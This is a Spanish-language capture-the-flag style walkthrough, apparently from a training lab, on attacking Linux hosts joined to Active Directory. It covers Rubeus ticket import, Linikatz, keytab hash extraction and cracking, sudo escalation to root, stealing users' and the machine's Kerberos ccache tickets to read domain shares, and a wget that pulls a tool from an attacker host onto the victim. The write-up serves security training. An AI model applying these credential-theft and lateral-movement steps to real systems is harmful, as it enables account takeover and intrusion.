C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
C:\htb> klist

Current LogonId is 0:0x31adf02

Cached Tickets: (1)

#0>     Client: julio @ INLANEFREIGHT.HTB
        Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
        Start Time: 10/10/2022 5:46:02 (local)
        End Time:   10/10/2022 15:46:02 (local)
        Renew Time: 10/11/2022 5:46:02 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

C:\htb>dir \\dc01\julio
 Volume in drive \\dc01\julio has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\dc01\julio

07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  04:18 PM                17 julio.txt
               1 File(s)             17 bytes
               2 Dir(s)  18,161,782,784 bytes free
```

***

## <mark style="color:purple;">Linikatz</mark>

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) es una herramienta creada por el equipo de seguridad de Cisco para explotar credenciales en máquinas Linux cuando hay integración con Active Directory. En otras palabras, Linikatz aporta un principio similar a `Mimikatz` en entornos UNIX.

Al igual que `Mimikatz`, para aprovechar Linikatz, necesitamos ser root en la máquina. Esta herramienta extraerá todas las credenciales, incluidos los tickets de Kerberos, de diferentes implementaciones de Kerberos como FreeIPA, SSSD, Samba, Vintella, etc. Una vez que extrae las credenciales, las coloca en una carpeta cuyo nombre comienza con `linikatz.`. Dentro de esta carpeta encontrará las credenciales en los diferentes formatos disponibles, incluidos ccache y keytabs. Estos se pueden utilizar, según corresponda, como se explicó anteriormente.

### **Descarga y ejecución de Linikatz**

```shell-session
afsh4ck@kali$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
afsh4ck@kali$ /opt/linikatz.sh
 _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   < (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

             =[ @timb_machine ]=

I: [freeipa-check] FreeIPA AD configuration
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
I: [sss-check] SSS AD configuration
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  7 12:17 /var/lib/sss/db/config.ldb
-rw------- 1 root root 4154 Oct 10 19:48 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
-rw------- 1 root root 1609728 Oct 10 19:55 /var/lib/sss/db/cache_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  4 16:26 /var/lib/sss/db/sssd.ldb
-rw-rw-r-- 1 root root 10406312 Oct 10 19:54 /var/lib/sss/mc/initgroups
-rw-rw-r-- 1 root root 6406312 Oct 10 19:55 /var/lib/sss/mc/group
-rw-rw-r-- 1 root root 8406312 Oct 10 19:53 /var/lib/sss/mc/passwd
-rw-r--r-- 1 root root 113 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
-rw-r--r-- 1 root root 40 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
-rw-r--r-- 1 root root 15 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
-rw-r--r-- 1 root root 12 Oct 10 19:55 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
-rw------- 1 root root 504 Oct  6 11:16 /etc/sssd/sssd.conf
I: [vintella-check] VAS AD configuration
I: [pbis-check] PBIS AD configuration
I: [samba-check] Samba configuration
-rw-r--r-- 1 root root 8942 Oct  4 16:25 /etc/samba/smb.conf
-rw-r--r-- 1 root root 8 Jul 18 12:52 /etc/samba/gdbcommands
I: [kerberos-check] Kerberos configuration
-rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
-rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Oct 10 19:55 /tmp/krb5cc_647402606
I: [samba-check] Samba machine secrets
I: [samba-check] Samba hashes
I: [check] Cached hashes
I: [sss-check] SSS hashes
I: [check] Machine Kerberos tickets
I: [sss-check] SSS ticket list
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:48:03, Flags: RIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [kerberos-check] User Kerberos tickets
Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/08/2022 11:32:01, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
Ticket cache: FILE:/tmp/krb5cc_647402606
Default principal: svc_workstations@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/10/2022 19:55:02  10/11/2022 05:55:02  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
    renew until 10/11/2022 19:55:02, Flags: FPRIA
    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
I: [check] KCM Kerberos tickets
```

***

## <mark style="color:purple;">Caso Práctico</mark>

Vamos a poner en práctica los conceptos que hemos visto en esta sección.

```
Host: 10.129.204.23
User: david@inlanefreight.htb
Pass: Password2
```

### <mark style="color:purple;">Pregunta 1</mark>

> Conéctese a la máquina de destino mediante SSH al puerto TCP/2222 y las credenciales proporcionadas. Lee la flag en el directorio personal de David

```bash
ssh 10.129.204.23 david@inlanefreight.htb
ssh: connect to host 10.129.204.23 port 22: Connection refused
```

Nos da este error al intentar conectarnos. Lo primero añadimos inlanefreight.htb a nuestro /etc/hosts. Después hacemos un escaneo de puertos para comprobar los puertos abiertos:

```bash
sudo nmap -v -sS -T5 10.129.204.23       

PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2222/tcp open  EtherNetIP-1
3389/tcp open  ms-wbt-server
```

Vamos a intentar conectarnos por SSH por el puerto 2222 de la siguiente manera:

```bash
ssh david@inlanefreight.htb@10.129.204.23 -p 2222

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.204.23]:2222' (ED25519) to the list of known hosts.

david@inlanefreight.htb@10.129.204.23's password: Password2

Last login: Tue Oct 25 13:23:44 2022 from 172.16.1.5

david@inlanefreight.htb@linux01:~$ 
```

Ya estamos conectados por SSH y leemos la flag correctamente:

```bash
david@inlanefreight.htb@linux01:~$ ls
flag.txt

david@inlanefreight.htb@linux01:~$ cat flag.txt 
Gett1ng_Acc3$$_to_LINUX01
```

### <mark style="color:purple;">Pregunta 2</mark>

> ¿Qué grupo puede conectarse a LINUX01?

```bash
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

Vemos que solo puede conectarse a Linux01 el grupo `Linux Admins`

### <mark style="color:purple;">Pregunta 3</mark>

> Busqca un archivo KeyTab al que tenga acceso de lectura y escritura. Envíe el nombre del archivo como respuesta.

```bash
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
   
   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
   288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
   287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
   286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
   131610      4 -rw-------   1 root     root         2694 Apr  5 10:09 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
   262607      4 -rw-rw-rw-   1 root     root          216 Apr  5 10:10 /opt/specialfiles/carlos.keytab
   131201      8 -rw-r--r--   1 root     root         4582 Oct  6  2022 /opt/keytabextract.py
   287958      4 drwx------   2 sssd     sssd         4096 Jun 21  2022 /var/lib/sss/keytabs
   398204      4 -rw-r--r--   1 root     root          380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri
```

Observamos que en el archivo `carlos.keytab` tenemos permisos de lectura y escritura:

```bash
4 -rw-rw-rw-   1 root   5 10:10 /opt/specialfiles/carlos.keytab
|------------|
```

### <mark style="color:purple;">Pregunta 5</mark>

> Extrae los hash del archivo `keytab` que encontró, descifra la contraseña, inicia sesión como usuario y envía la flag en el directorio de inicio del usuario.

```shell-session
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab             

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : carlos/
	NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
	AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
	AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

Ahora que tenemos los hashes vamos a crackearlo, con john por ejemplo, y encontramos la contraseña en plano: `Password5`

```bash
john --format=nt hash.nt 

Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 ASIMD 4x2])
Warning: no OpenMP support for this hash type, consider --fork=4
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Password5        (?)
```

Ahora en el host que hemos comprometido cambiamos al usuario carlos con la contraseña `Password5` y accedemos correctamente:

```bash
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
Password: 
carlos@inlanefreight.htb@linux01:~$ ls
flag.txt  script-test-results.txt
carlos@inlanefreight.htb@linux01:~$ cat flag.txt 
C@rl0s_1$_H3r3
```

### <mark style="color:purple;">Pregunta 6</mark>

> Verifica el crontab de Carlos y busca las KeyTab a las que Carlos tiene acceso. Intenta obtener las credenciales del usuario svc\_workstations y utilízalas para autenticarte mediante SSH. Envía el flag.txt en el directorio de inicio de svc\_workstations

```bash
carlos@inlanefreight.htb@linux01:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

```bash
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

El script se ejecuta cada 5 minutos, y encontramos la ruta del archivo keytab, que vamos a usar para extraer los hashes con `keytabextract.py`:

```bash
carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
[!] No RC4-HMAC located. Unable to extract NTLM hashes.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : svc_workstations/
	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
carlos@inlanefreight.htb@linux01:~$ 
```

Buscando un poco más en la misma ruta encontramos otro keytab más interesante: `svc_workstations._all.kt`, el cual si contiene un hash NT (más fácil de crackear)

```bash
carlos@inlanefreight.htb@linux01:~/.scripts$ ls
john.keytab  kerberos_script_test.sh  svc_workstations._all.kt  svc_workstations.kt

carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py svc_workstations._all.kt 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : svc_workstations/
	NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
	AES-128 HASH : 3a7e52143531408f39101187acc80677
```

Por utilizar otra herramienta de crackeo, vamos a crackear este hash con [CrackStation](https://crackstation.net/), y nos devuelve rápidamente la contraseña: `Password4`

<figure><img src="/files/yAr2MDFIH4JiJVcWTbze" alt=""><figcaption></figcaption></figure>

```bash
ssh svc_workstations@inlanefreight.htb@10.129.71.133 -p 2222
svc_workstations@inlanefreight.htb@10.129.71.133's password: Password4

svc_workstations@inlanefreight.htb@linux01:~$ ls
flag.txt

svc_workstations@inlanefreight.htb@linux01:~$ cat flag.txt 
Mor3_4cce$$_m0r3_Pr1v$
```

### <mark style="color:purple;">Pregunta 7</mark>

> Verifica los privilegios sudo de svc\_workstation y obtén acceso como root. Envía la flag en el directorio /root/flag.txt como respuesta.

```bash
svc_workstations@inlanefreight.htb@linux01:~$ sudo -l

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL

svc_workstations@inlanefreight.htb@linux01:~$ sudo su

root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
root

root@linux01:/home/svc_workstations@inlanefreight.htb# cd /root

root@linux01:~# ls
flag.txt  snap

root@linux01:~# cat flag.txt 
Ro0t_Pwn_K3yT4b
```

### <mark style="color:purple;">Pregunta 8</mark>

> Verifica el directorio /tmp y busque el ticket Kerberos de Julio (archivo ccache). Importa el ticket y lee el contenido de julio.txt desde la carpeta compartida del dominio \DC01\julio.

```bash
root@linux01:~# ls -la /tmp
total 76
drwxrwxrwt 13 root                               root                           4096 Apr  5 13:25 .
drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
drwxrwxrwt  2 root                               root                           4096 Apr  5 12:15 .font-unix
drwxrwxrwt  2 root                               root                           4096 Apr  5 12:15 .ICE-unix
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Apr  5 13:25 krb5cc_647401106_bnjeyc
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Apr  5 13:25 krb5cc_647401106_HRJDux
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Apr  5 12:25 krb5cc_647401107_ahcYZN
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 2928 Apr  5 13:03 krb5cc_647401109_ztQpo0
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Apr  5 13:27 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1746 Apr  5 12:33 krb5cc_647402606_91JyEJ
drwx------  3 root                               root                           4096 Apr  5 12:15 snap.lxd
drwx------  3 root                               root                           4096 Apr  5 12:15 systemd-private-866db18e0fb44516b17af88cdbdbca88-ModemManager.service-8djdRg
drwx------  3 root                               root                           4096 Apr  5 12:16 systemd-private-866db18e0fb44516b17af88cdbdbca88-systemd-logind.service-WV8jnj
drwx------  3 root                               root                           4096 Apr  5 12:15 systemd-private-866db18e0fb44516b17af88cdbdbca88-systemd-resolved.service-mL6JVe
drwx------  3 root                               root                           4096 Apr  5 12:15 systemd-private-866db18e0fb44516b17af88cdbdbca88-systemd-timesyncd.service-ZQCJUg
drwxrwxrwt  2 root                               root                           4096 Apr  5 12:15 .Test-unix
drwx------  2 root                               root                           4096 Apr  5 12:15 vmware-root_695-4021718990
drwxrwxrwt  2 root                               root                           4096 Apr  5 12:15 .X11-unix
drwxrwxrwt  2 root                               root                           4096 Apr  5 12:15 .XIM-unix
```

Vamos a importar el ticket de Julio: `krb5cc_647401106_bnjeyc`

```bash
root@linux01:~# cp /tmp/krb5cc_647401106_bnjeyc .
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_bnjeyc
root@linux01:~# klist
Ticket cache: FILE:/root/krb5cc_647401106_bnjeyc
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
04/05/2024 13:25:01  04/05/2024 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
	renew until  04/06/2024 13:25:01
	
root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_bnjeyc
root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
  $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
  Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
  Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
  john                                D        0  Mon Jul 18 13:19:50 2022
  julio                               D        0  Mon Jul 18 13:54:02 2022
  pagefile.sys                      AHS 738197504  Fri Apr  5 12:15:40 2024
  PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
  Program Files                      DR        0  Wed Oct  6 20:50:50 2021
  Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
  ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
  SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
  System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
  tools                               D        0  Thu Sep 22 18:19:04 2022
  Users                              DR        0  Thu Oct  6 11:46:05 2022
  Windows                             D        0  Mon Oct 10 10:48:55 2022
```

Y por fin vamos a leer el archivo `julio.txt` de `DC01/julio`

```bash
root@linux01:~# smbclient //dc01/julio -k -c 'get julio.txt' -o julio.txt
getting file \julio.txt of size 17 as julio.txt (170000.0 KiloBytes/sec) (average inf KiloBytes/sec)

root@linux01:~# ls
flag.txt  julio_ticket  julio.txt  keytabextract.py  krb5cc_647401106_bnjeyc  snap

root@linux01:~# cat julio.txt 
JuL1()_SH@re_fl@g
```

### <mark style="color:purple;">Pregunta 9</mark>

> Utiliza el ticket LINUX01$ Kerberos para leer el flag que se encuentra en \DC01\linux01. Envía el contenido como respuesta (la flag comienza con Us1nG\_)

Ahora que somos root vamos a leer el KeyTab `krb5.keytab`, que se encuentra en la ruta `/etc/krb5.keytab`

```bash
root@linux01:~# cd /etc

root@linux01:/etc# ls | grep keytab
krb5.keytab

# Lo copiamos a una carpeta temporal

root@linux01:/etc# mktemp -d
/tmp/tmp.i1Vm3VA6KZ
root@linux01:/etc# cp krb5.keytab /tmp/tmp.i1Vm3VA6KZ
root@linux01:/etc# cd /tmp/tmp.i1Vm3VA6KZ
root@linux01:/tmp/tmp.i1Vm3VA6KZ# ls
krb5.keytab
```

Ahora vamos a extraer los hashes como ya conocemos con `KeyTabExtract` enviando el ejecutable a la carpeta temporal para ejecutarlo desde ahí:

```bash
root@linux01:/tmp/tmp.i1Vm3VA6KZ# wget http://10.10.15.5/keytabextract.py                                                               
--2024-04-05 14:26:12--  http://10.10.15.5/keytabextract.py
Connecting to 10.10.15.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4582 (4.5K) [text/x-python]
Saving to: ‘keytabextract.py’

keytabextract.py   100%[===============>]   4.47K  --.-KB/s    in 0s      

2024-04-05 14:26:12 (568 MB/s) - ‘keytabextract.py’ saved [4582/4582]

root@linux01:/tmp/tmp.i1Vm3VA6KZ# ls
keytabextract.py  krb5.keytab
```

```bash
root@linux01:/tmp/tmp.i1Vm3VA6KZ# python3 keytabextract.py krb5.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : LINUX01$/
	NTLM HASH : 5aa7d65408b1c36bb2d0892b8e53bce8
	AES-256 HASH : e95c6ed83a660fb802919f7554fa402a71f5e0f2b4e36bfbf545c33ee353f0ea
	AES-128 HASH : 24536d742cface9c06fbd8f257bd1de2
root@linux01:/tmp/tmp.i1Vm3VA6KZ# 
```

Estos hashes, al tratar de crackearlos no podemos, por lo que vamos a usar otra técnica. Vamos a enviar linikatz al equipo víctima y ejecutarlo para ver si nos da algo más de información:

```bash
root@linux01:/tmp/tmp.X2sbj7plRy# bash linikatz.sh
 _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   < (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

             =[ @timb_machine ]=
             
<----SNIP---->
I: [samba-check] Samba machine secrets
I: [samba-check] Samba hashes
I: [check] Cached hashes
I: [sss-check] SSS hashes
linikatz.sh: line 349: tdbdump: command not found
I: [check] Machine Kerberos tickets
I: [sss-check] SSS ticket list
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB
```

Encontramos la ruta de los archivos ccache para LINUX01 :&#x20;

```
/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
```

```bash
root@linux01:/tmp/tmp.X2sbj7plRy# ls -la /var/lib/sss/db
total 5680
drwx------  2 sssd sssd    4096 Apr  8 08:25 .
drwxr-xr-x 10 root root    4096 Oct  4  2022 ..
-rw-------  1 root root 1609728 Apr  8 08:25 cache_inlanefreight.htb.ldb
-rw-------  1 root root    4154 Apr  8 08:25 ccache_INLANEFREIGHT.HTB
-rw-------  1 root root 1286144 Apr  8 06:54 config.ldb
-rw-------  1 root root 1286144 Oct  4  2022 sssd.ldb
-rw-------  1 root root 1609728 Apr  8 08:25 timestamps_inlanefreight.htb.ldb
```

Ahora vamos a importar este archivo ccache a nuestra sesión actual:

```bash
root@linux01:# klist
Ticket cache: FILE:/tmp/krb5cc_647401109_ot7iNW
Default principal: svc_workstations@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
04/08/2024 07:11:13  04/08/2024 17:11:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
	renew until  04/09/2024 07:11:13
	
root@linux01:# cp /var/lib/sss/db/ccache_INLANEFREIGHT.HTB .
root@linux01:# export KRB5CCNAME=/var/lib/sss/db/ccache_INLANEFREIGHT.HTB

root@linux01:/tmp/tmp.X2sbj7plRy# klist
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
04/08/2024 08:40:44  04/08/2024 18:40:44  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
	renew until 04/09/2024 08:40:44
04/08/2024 08:40:44  04/08/2024 18:40:44  ldap/dc01.inlanefreight.htb@
	renew until 04/09/2024 08:40:44
04/08/2024 08:40:44  04/08/2024 18:40:44  ldap/dc01.inlanefreight.htb@INLANEFREIGHT.HTB
	renew until 04/09/2024 08:40:44
```

Una vez importado, vamos accedemos al directorio de la flag en `//DC01/linux01`:

```bash
root@linux01:/tmp/tmp.X2sbj7plRy# smbclient //DC01/linux01 -k -c ls -no-pass
  .                                   D        0  Wed Oct  5 14:17:02 2022
  ..                                  D        0  Wed Oct  5 14:17:02 2022
  flag.txt                            A       52  Wed Oct  5 14:17:02 2022

		7706623 blocks of size 4096. 4459755 blocks available
		
root@linux01:/tmp/tmp.X2sbj7plRy# smbclient //DC01/linux01 -k -c 'get flag.txt' -N
getting file \flag.txt of size 52 as flag.txt (50.8 KiloBytes/sec) (average 50.8 KiloBytes/sec)

root@linux01:/tmp/tmp.X2sbj7plRy# cat flag.txt 
Us1nG_KeyTab_Like_@_PRO
```
